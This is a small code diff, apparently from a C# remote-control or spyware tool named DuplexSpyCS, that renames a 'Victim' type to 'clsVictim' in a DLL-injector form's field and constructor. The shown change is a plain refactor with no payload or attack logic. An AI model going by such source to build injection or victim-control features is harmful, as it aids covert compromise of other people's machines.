@@ -12,10 +12,10 @@ namespace DuplexSpyCS
 {
     public partial class frmTaskDLLInjector : Form
     {
-        public Victim v;
+        public clsVictim v;
         private int m_nProcId;
 
-        public frmTaskDLLInjector(Victim v, int nProcId)
+        public frmTaskDLLInjector(clsVictim v, int nProcId)
         {
             InitializeComponent();
 
